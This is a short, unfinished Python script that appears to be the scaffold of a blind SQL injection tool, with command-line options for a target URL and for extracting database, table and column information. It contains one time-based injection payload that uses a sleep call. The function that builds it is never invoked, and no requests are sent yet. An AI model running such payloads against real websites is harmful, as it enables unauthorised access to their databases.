import requests
import argparse
import textwrap

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, 
epilog = textwrap.dedent('''
Example: blindsqli.py -u https://www.test.com/index.php?id=1
         blindsqli.py -u https://www.test.com/index.php?id=1 -d
         blindsqli.py -u https://www.test.com/index.php?id=1 -t -s 5
    '''))
parser.add_argument('-u', '--url', type=str, help='url to be checked', required=True)
parser.add_argument('-d', '--database', help='get database name', action="store_true")
parser.add_argument('-t', '--table', help='get table name', action="store_true")
parser.add_argument('-c', '--column', help='get total columns', action="store_true")
parser.add_argument('-s', '--time', type=int, help='set time for blind sqli (default=3)', default=3)
args = parser.parse_args()

COLOR = {
    "HEADER": "\033[95m",
    "BLUE": "\033[94m",
    "GREEN": "\033[92m",
    "RED": "\033[91m",
    "ENDC": "\033[0m",
}

def check_url():
    test_query = ' AND (SELECT IF(length("hikaru") = 6,sleep(%s),"Null"))' % args.time

def main():
    session = requests.session()
    print(f"{COLOR['RED']}Testing Red!!{COLOR['ENDC']}")

if __name__ == "__main__":
    main()